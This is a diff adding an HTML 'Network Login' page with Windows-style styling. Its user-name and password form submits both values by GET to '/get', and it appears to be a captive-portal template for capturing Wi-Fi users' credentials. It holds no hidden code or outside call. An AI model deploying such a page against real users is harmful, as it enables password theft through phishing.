@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Network Login</title>
+    <style>
+      :root {
+        --background-color: #102332;
+        --login-box-background: #085e9e;
+        --input-border-color-active: #0078d7;
+        --input-border-color-inactive: #6ba0c4;
+        --input-background-color-active: #ffffff;
+        --input-background-color-inactive: #093a5f;
+        --button-background-color-inactive: #3d7fb1;
+        --button-background-color-hover: #3b79ab;
+        --placeholder-color: var(--input-border-color-inactive);
+      }
+
+      body,
+      html {
+        height: 100%;
+        margin: 0;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background-color: var(--background-color);
+        color: white;
+      }
+
+      .login-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100%;
+      }
+
+      .login-box {
+        background-color: var(--login-box-background);
+        padding: 20px;
+        border-radius: 0;
+        box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.75);
+        width: 400px;
+        display: flex;
+        flex-direction: row;
+        align-items: flex-start;
+      }
+
+      .login-box .logo {
+        font-size: 2em;
+        margin-right: 10px;
+        flex-shrink: 0;
+        color: white;
+      }
+
+      .login-box .content {
+        flex-grow: 1;
+      }
+
+      .login-box .content h1 {
+        font-size: 1.5em;
+        margin: 0;
+        text-align: left;
+        font-weight: normal;
+      }
+
+      .login-box .content p {
+        font-size: 1em;
+        color: #cfd8dc;
+        margin: 10px 0;
+        text-align: left;
+      }
+
+      .login-box .content input[type="text"],
+      .login-box .content input[type="password"] {
+        width: calc(100% - 20px);
+        padding: 10px;
+        margin: 5px 0;
+        border: 2px solid var(--input-border-color-inactive);
+        border-radius: 0;
+        background-color: var(--input-background-color-inactive);
+        color: #cfd8dc;
+        outline: none;
+        transition: background-color 0.1s, border-color 0.1s;
+      }
+
+      .login-box .content input[type="text"]::placeholder,
+      .login-box .content input[type="password"]::placeholder {
+        color: var(--placeholder-color);
+      }
+
+      .login-box .content input[type="text"]:focus,
+      .login-box .content input[type="password"]:focus {
+        background-color: var(--input-background-color-active);
+        border-color: var(--input-border-color-active);
+        color: black;
+      }
+
+      .login-box .content input[type="password"] {
+        margin-bottom: 20px;
+      }
+
+      .login-box .content button[type="submit"],
+      .login-box .content button[type="button"] {
+        width: 48%;
+        background-color: var(--button-background-color-inactive);
+        color: white;
+        cursor: pointer;
+        border-radius: 0;
+        padding: 10px 0;
+        border: none;
+        transition: background-color 0.3s;
+      }
+
+      .login-box .content button[type="submit"]:disabled {
+        background-color: var(--button-background-color-inactive);
+        color: #888888;
+      }
+
+      .login-box .content button[type="submit"]:hover:not(:disabled),
+      .login-box .content button[type="button"]:hover {
+        background-color: var(--button-background-color-hover);
+      }
+
+      .login-box .content .button-container {
+        display: flex;
+        justify-content: space-between;
+        gap: 2px;
+      }
+    </style>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.querySelector("form");
+        const submitButton = form.querySelector("button[type='submit']");
+        const inputs = form.querySelectorAll(
+          "input[type='text'], input[type='password']"
+        );
+
+        function checkFormValidity() {
+          let allValid = true;
+          inputs.forEach((input) => {
+            if (!input.value) {
+              allValid = false;
+            }
+          });
+          submitButton.disabled = !allValid;
+        }
+
+        inputs.forEach((input) => {
+          input.addEventListener("input", checkFormValidity);
+        });
+
+        checkFormValidity();
+      });
+    </script>
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="login-box">
+        <div class="logo">🌐</div>
+        <div class="content">
+          <h1>Network Login</h1>
+          <p>Enter your user name and password</p>
+          <form action="/get" id="login-form">
+            <input
+              type="text"
+              name="email"
+              placeholder="User name"
+              required
+            />
+            <input
+              type="password"
+              name="password"
+              placeholder="Password"
+              required
+            />
+            <div class="button-container">
+              <button type="submit">OK</button>
+              <button type="button">Cancel</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
